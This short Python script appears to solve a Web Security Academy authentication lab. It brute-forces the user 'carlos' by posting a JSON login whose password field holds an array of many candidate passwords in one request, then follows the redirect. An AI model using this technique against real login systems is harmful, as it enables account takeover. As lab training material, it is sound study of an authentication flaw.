from web_security_academy.core.utils import *


def solve_lab(session):
    passwords = auth_lab_passwords()
    print_info("Logging in using the following JSON:")
    data = {"username": "carlos", "password": passwords}
    print(data)

    resp = session.post_path("/login", json=data, allow_redirects=False)
    if resp.status_code == 200:
        print_fail("Unable to log in as carlos.")
    else:
        print_success("Successfully logged in as carlos.\n")
        session.get_path(resp.headers["Location"])
